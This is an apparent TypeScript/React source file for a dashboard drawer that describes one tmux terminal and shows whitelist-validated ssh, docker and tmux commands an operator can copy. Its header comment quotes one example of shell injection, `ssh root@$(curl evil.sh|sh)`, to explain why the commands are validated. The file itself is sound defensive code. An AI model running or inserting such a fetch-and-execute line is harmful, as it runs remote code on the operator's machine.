/**
 * Everything known about one Terminal, and how to see it without this page (ADR 0020, slice 7b).
 *
 * A tile shows a screen and four chips. This is where the rest lives: actor@version, tag, fleet,
 * execution mode and what a crashed tmux server costs in that mode, the four health sentences, how
 * old the screen is — and THE COMMANDS AN OPERATOR WOULD RUN THEMSELVES.
 *
 * WHY THE COMMANDS ARE THE POINT. This whole feature exists because the only view of what a Worker is
 * printing used to require a terminal, a key and knowing the Machine's address. A Dashboard that
 * replaces that knowledge is worse than one that teaches it: when the streamer is down, the ticket
 * mint 503s, or a tile has been blank for a minute, the operator needs the underlying commands, and
 * the honest place to put them is next to the tile that is failing. They are also the read path's own
 * documentation — the `capture-pane` line here is the one the wall runs, and the grouped-session
 * attach is the form slice 2 MEASURED as the one that does not yank the current window of an operator
 * already attached on the Machine.
 *
 * THE COMMANDS ARE VALIDATED BEFORE THEY ARE SHOWN. A command in a drawer is not executed by this
 * page — and that is exactly why it needs a whitelist. An operator copies what a dashboard shows them;
 * `ssh root@$(curl evil.sh|sh)` rendered as a helpful snippet is a shell injection with the operator
 * as the interpreter. Every interpolated value is admitted by `@core/panels/ids`'s `SAFE` patterns —
 * the same module the streamer uses, imported rather than re-derived — and a Terminal that fails is
 * shown WITHOUT commands and told why.
 *
 * The document is built as markdown by {@link terminalDetailMarkdown}, a pure function, so the
 * wording, the escaping and the refusal are all pinned by tests without a browser.
 */

import { SAFE, tryParseTerminalId, type ExecutionMode } from '@core/panels/ids';
import { sharedQueue } from '@core/panels/pollers';
import { modeStakes } from './chrome/tileRef';
import { SCROLLBACK_LINES } from './TerminalTile';
import { healthEntries, inapplicableReason, type Terminal } from './panelsClient';
import Markdown from './widgets/Markdown';
import { formatAge, formatBytes, formatInstant } from './widgets/format';
import { cell, definitionTable, fence, inlineCode, line } from './widgets/mdsource';

/** How a tile is being fed — `{t:'state'}`'s `mode`, which is a DIFFERENT axis from the execution
 * mode below. Declared locally rather than imported from `TerminalTile`: slice 7a is restructuring
 * that file, and a three-member union is not worth a dependency on it. */
export type Feed = 'snapshot' | 'live' | 'error';

/** A Terminal, with the execution mode the wire has carried since slice 6. Optional because
 * `panelsClient.Terminal` (which slice 1 owns) has not grown the field yet — the id's prefix is the
 * fallback, and it is the same value by construction. */
export type TerminalDetail = Terminal & { mode?: ExecutionMode };

export interface DetailInput {
  terminal: TerminalDetail;
  /** `Date.now()` at render. Passed in so the document is a pure function of its inputs. */
  now: number;
  feed?: Feed;
  /** Bytes this Terminal was told were dropped by the streamer's byte cap. */
  elided?: number;
}

/**
 * How a command reaches this mode's tmux server. One clause, because it is the half of the mode's
 * meaning that is about transport rather than about danger.
 *
 * THE DANGER HALF IS NOT HERE. `chrome/tileRef.ts:modeStakes` is where the UI gets those words, by
 * slice 7a's explicit design ("so the sidebar and the tile header cannot drift from each other"), and
 * a drawer with its own phrasing of "what a crashed tmux server costs" would be exactly the drift that
 * file exists to prevent. CONTRACT.md's slice 6 amendment requires the asymmetry to be stated in the
 * UI; it does not permit two statements of it.
 */
const MODE_TRANSPORT: Record<ExecutionMode, string> = {
  fleet: 'a Machine, reached over SSH',
  docker: 'a worker container, reached with `docker exec`',
  local: 'this host, with no transport at all',
};

/** The mode this Terminal is in: the wire's field when present, else the id's prefix. */
export function modeOf(terminal: TerminalDetail): ExecutionMode {
  return terminal.mode ?? tryParseTerminalId(terminal.id)?.mode ?? 'fleet';
}

/**
 * The Machine's own numbers, as one line — or nothing, when nobody measured them.
 *
 * UNMEASURED IS AN ABSENT ROW AND NOT A DASH. Every other value on this page is something the
 * streamer asserted; a `—` next to "cpu" reads as a reading of zero, and this repo's whole
 * health contract is that "`unknown` is a value, never a shrug". A Machine with no Warden simply has
 * no such row, which is true and unambiguous.
 *
 * ZERO IS A READING AND IS SHOWN. An idle Machine reports `cpu: 0`, which is a fact; the check is on
 * the field's PRESENCE, never on its truthiness — the difference between "0%" and no row at all.
 */
export function machineLoad(t: Terminal['telemetry']): string | undefined {
  if (!t) return undefined;
  const bits: string[] = [];
  if (t.cpu !== undefined) bits.push(`cpu ${Math.round(t.cpu * 100)}%`);
  if (t.memory !== undefined) bits.push(`memory ${Math.round(t.memory * 100)}%`);
  if (t.load1 !== undefined) bits.push(`load ${t.load1.toFixed(2)}`);
  if (!bits.length) return undefined;
  return `${bits.join(', ')} — reported by this Machine's Warden, not measured from here`;
}

/** Which value was refused, so the sentence can name it. "No commands" and "no commands because the
 * ADDRESS is malformed" send an operator to different places — the first to this page's author, the
 * second to the stack that produced the inventory. */
interface Refusal {
  field: 'id' | 'address';
  value: string;
}

/**
 * The commands section, or a refusal.
 *
 * Refuses when any value that would be interpolated is not admitted by the whitelist the streamer
 * itself uses. The refused VALUE is still shown by the caller, as prose — an operator diagnosing this
 * needs to see the malformed string, and a table cell is not a command someone copies.
 */
function commandsFor(terminal: TerminalDetail, mode: ExecutionMode): string | Refusal {
  const ref = tryParseTerminalId(terminal.id);
  if (!ref) return { field: 'id', value: terminal.id };
  const { session, window } = ref;
  const node = ref.machine;
  // A per-viewer session name, `kp-…`-shaped like the streamer's own so it is recognisable on the
  // Machine and killable by the same rule (`attach.ts:killViewerCommand` refuses anything else).
  const viewer = 'kp-you';
  const target = `'${session}:${window}'`;

  if (mode === 'fleet') {
    // `host` comes from the Pulumi inventory, not from the id, so it gets its own admission.
    if (!SAFE.host.test(terminal.host)) return { field: 'address', value: terminal.host };
    return [
      '# 1. one screen, exactly what the wall paints from',
      `ssh -i "$KONTRA_SSH_KEY" root@${terminal.host} \\`,
      `  "tmux capture-pane -p -e -S -50 -t ${target}"`,
      '',
      '# 2. watch it live, without disturbing anyone attached on the Machine',
      `ssh -t -i "$KONTRA_SSH_KEY" root@${terminal.host}`,
      '#    then, on the Machine:',
      `tmux new-session -A -d -s ${viewer} -t '${session}'`,
      `tmux select-window -t '${viewer}:${window}'   # the VIEWER session, never the owner's`,
      `tmux attach-session -r -t ${viewer}`,
      '',
      '# 3. afterwards — a viewer session OUTLIVES its client (measured), and while one exists the',
      "#    owner's windows survive a kill-session on the owner",
      `tmux kill-session -t ${viewer}`,
    ].join('\n');
  }

  if (mode === 'docker') {
    return [
      '# 1. one screen, exactly what the wall paints from',
      `docker exec ${node} tmux capture-pane -p -e -S -50 -t ${target}`,
      '',
      '# 2. watch it live, without disturbing anyone attached in the container',
      `docker exec -it ${node} sh`,
      '#    then, in the container:',
      `tmux new-session -A -d -s ${viewer} -t '${session}'`,
      `tmux select-window -t '${viewer}:${window}'`,
      `tmux attach-session -r -t ${viewer}`,
      '',
      `tmux kill-session -t ${viewer}   # when you are done`,
    ].join('\n');
  }

  return [
    '# 1. one screen, exactly what the wall paints from',
    `tmux capture-pane -p -e -S -50 -t ${target}`,
    '',
    '# 2. watch it live, without disturbing your own attached client',
    `tmux new-session -A -d -s ${viewer} -t '${session}'`,
    `tmux select-window -t '${viewer}:${window}'`,
    `tmux attach-session -r -t ${viewer}`,
    '',
    `tmux kill-session -t ${viewer}   # when you are done`,
  ].join('\n');
}

/**
 * One Terminal as markdown.
 *
 * Pure: same inputs, same document. `now` is a parameter for that reason — a drawer whose text depends
 * on the wall clock cannot be pinned by a test, and "snapshot age" is the number an operator most
 * needs to distinguish "this Worker is quiet" from "this tile stopped being fed".
 */
export function terminalDetailMarkdown(input: DetailInput): string {
  const { terminal, now } = input;
  const mode = modeOf(terminal);
  const ref = tryParseTerminalId(terminal.id);
  const feed = input.feed ?? 'snapshot';
  const elided = input.elided ?? 0;
  const queue = terminal.actor === '' ? undefined : sharedQueue(terminal.actor, terminal.version);

  const parts: string[] = [];

  parts.push(`## ${cell(terminal.id, 140)}`);
  parts.push(`**${cell(mode, 20)}** — ${MODE_TRANSPORT[mode]}. ${modeStakes(mode).sentence}`);

  parts.push(
    definitionTable([
      ['node', terminal.machine],
      ['session', ref?.session ?? '(unparseable id)'],
      ['window', terminal.window],
      // WHAT IS IN THE PANE, verbatim, and what it is NOT evidence of. A drawer that printed `zsh`
      // with no qualifier would invite the reading the streamer itself refuses to make: kontra's
      // hold shell reports itself whether the Worker is running or finished (measured), which is
      // why `health.process` below says `unknown` so often.
      [
        'pane command',
        terminal.command === undefined || terminal.command === ''
          ? undefined
          : `\`${cell(terminal.command, 60)}\`${
              terminal.health.process === 'unknown'
                ? ' — a hold shell reports itself whether the Worker is running or finished, so this is not a reading either way'
                : ''
            }`,
      ],
      [
        'pane size',
        terminal.paneCols
          ? `${terminal.paneCols}×${terminal.paneRows} cells (the PANE, pinned with \`window-size manual\` — not this tile)`
          : undefined,
      ],
      [
        'exit status',
        terminal.exitStatus
          ? `${cell(terminal.exitStatus, 8)} — the command in this pane is over; the window is held open so its output stays readable`
          : undefined,
      ],
      // THE MACHINE'S OWN NUMBERS, from its **Warden** (ADR 0037). One row rather than three,
      // because they are read together — a Machine at 100% CPU with a load of 1 is working, and the
      // same CPU at a load of 40 is thrashing — and because the row is absent entirely when nobody
      // measured, rather than showing three dashes that read like zeroes.
      ['machine load', machineLoad(terminal.telemetry)],
      ['actor', terminal.actor === '' ? 'none placed' : `${terminal.actor}@${terminal.version || '?'}`],
      ['tag', terminal.tag],
      ['fleet', terminal.fleet],
      // The queue `kontra workers list` describes — the handler's shared queue, not the actor's
      // sessions queue. Derived by the same function the streamer's poller signal uses.
      ['shared queue', queue],
      ['address', mode === 'fleet' ? terminal.host : '(no transport dials this mode)'],
      ['public address', terminal.publicIp === '' ? undefined : terminal.publicIp],
      ['feed', feed],
      ['last screen', `${formatAge(terminal.lastSnapshotAt, now)} (${formatInstant(terminal.lastSnapshotAt)})`],
      ['elided', elided > 0 ? `${formatBytes(elided)} dropped by the byte cap` : 'nothing dropped'],
      // The frontend's own scrollback ring, stated (slice 05): tmux copy-mode is a keyboard feature a
      // read-only pane cannot reach, so the browser holds the history, bounded.
      ['scrollback', `${SCROLLBACK_LINES.toLocaleString()} lines (this browser's ring, not tmux copy-mode)`],
    ])
  );

  // EVERY SIGNAL, EVERY SENTENCE, in the same words `HealthChips` shows — one derivation
  // (`panelsClient.healthEntries`), so a chip and this drawer can never disagree about a Terminal.
  //
  // THIS IS WHERE AN OMITTED CHIP STAYS INSPECTABLE. The tile's row drops an axis that cannot say
  // anything about a pane in this mode (`ssh` on a `local` pane, `loads` where no vmagent has ever
  // run); ADR 0020 allows that only because the signal is still readable somewhere, and this is the
  // somewhere. It is marked as inapplicable rather than silently reported, because "there is nothing
  // to measure here" and "we did not measure it" are different facts with different fixes.
  parts.push('### Health');
  parts.push(
    healthEntries(terminal.health, mode)
      .map((entry) => {
        const why = inapplicableReason(entry.signal, mode);
        if (why !== undefined) return `- ${cell(why, 300)} _(not applicable in ${mode} mode)_`;
        return `- ${cell(entry.text, 300)}${entry.ok === null ? ' _(not measured)_' : ''}`;
      })
      .join('\n')
  );

  parts.push('### See it yourself');
  const commands = commandsFor(terminal, mode);
  if (typeof commands !== 'string') {
    parts.push(
      `No commands are shown for this Terminal: its ${commands.field} ` +
        `${inlineCode(line(commands.value, 140))} is not admitted by the patterns every value crosses ` +
        'before it may appear in a command. That is a bug or an attack, not a typo to work around — ' +
        'the streamer refuses the same value, and a copyable command built from it would make you ' +
        'the shell that runs it.'
    );
  } else {
    parts.push(fence('sh', commands));
    parts.push(
      '`$KONTRA_SSH_KEY` is the streamer\'s own key path (`/run/secrets/fleet_key` by default); on ' +
        'your machine use the fleet key you deployed with. The streamer adds `BatchMode=yes`, ' +
        '`ControlMaster` and keepalives to every SSH — none of which change what you see.'
    );
  }

  /*
   * THE RING IS BOUNDED, AND THE OPERATOR IS TOLD SO rather than discovering it when a line they
   * wanted has scrolled off. What survives a reconnect is the other half and is a real design item:
   * a snapshot pane resets its ring on every repaint, a dropped socket reseeds from a fresh screen,
   * and no bytes are held across the gap — which is the same property that lets the reconnect
   * promise never to duplicate output. It was `scrollback.ts:scrollbackNotice()`, a one-line return
   * with the wording pinned by a node test; the sentence is said here, in the only place that says
   * it, and `DetailDrawer.test.ts` reads it out of the drawer's own document.
   */
  parts.push(
    `_This pane keeps its own scrollback ring of about ${SCROLLBACK_LINES.toLocaleString()} lines — ` +
      'tmux copy-mode is a keyboard feature a read-only pane cannot reach, so the frontend holds the ' +
      'history. A snapshot pane resets the ring on every repaint, and a dropped socket reseeds from a ' +
      'fresh screen: no bytes are held across a reconnect, so nothing older is replayed and nothing ' +
      'is shown twice._'
  );

  parts.push(
    '_A Terminal is a screen, not a log: snapshots are lossy by construction and a live attach is ' +
      'lossier still. The Manifest, the journal on the Machine and the lake are the record._'
  );

  return parts.filter((p) => p !== '').join('\n\n');
}

export interface DetailDrawerProps {
  terminal: TerminalDetail;
  feed?: Feed;
  elided?: number;
  /** Injected by tests; defaults to now. */
  now?: number;
  onClose?: () => void;
  className?: string;
}

/**
 * The drawer itself — a header, a close button, and the document.
 *
 * Rendered through the same `Markdown` component as pane content. That is deliberate: this document
 * is ours, but a renderer with a "trusted" path is a renderer that eventually gets handed untrusted
 * content through it.
 */
export default function DetailDrawer({
  terminal,
  feed,
  elided,
  now,
  onClose,
  className,
}: DetailDrawerProps): JSX.Element {
  const source = terminalDetailMarkdown({
    terminal,
    now: now ?? Date.now(),
    ...(feed !== undefined ? { feed } : {}),
    ...(elided !== undefined ? { elided } : {}),
  });

  return (
    <aside
      data-testid={`detail-${terminal.id}`}
      aria-label={`Details for ${terminal.id}`}
      className={`flex min-h-0 w-full max-w-md flex-col overflow-hidden rounded border ${className ?? ''}`}
      style={{ background: '#0b0b0e' }}
    >
      <div className="flex items-center gap-2 border-b border-zinc-800 px-2 py-1">
        <span className="truncate text-[11px] font-semibold uppercase tracking-wide text-muted-foreground">
          {terminal.machine} · {terminal.window}
        </span>
        {onClose && (
          <button
            data-testid={`detail-close-${terminal.id}`}
            onClick={onClose}
            className="ml-auto rounded border px-1 text-[11px]"
          >
            close
          </button>
        )}
      </div>
      <div className="min-h-0 flex-1 overflow-auto px-2 py-1">
        <Markdown source={source} testId={`detail-markdown-${terminal.id}`} />
      </div>
    </aside>
  );
}
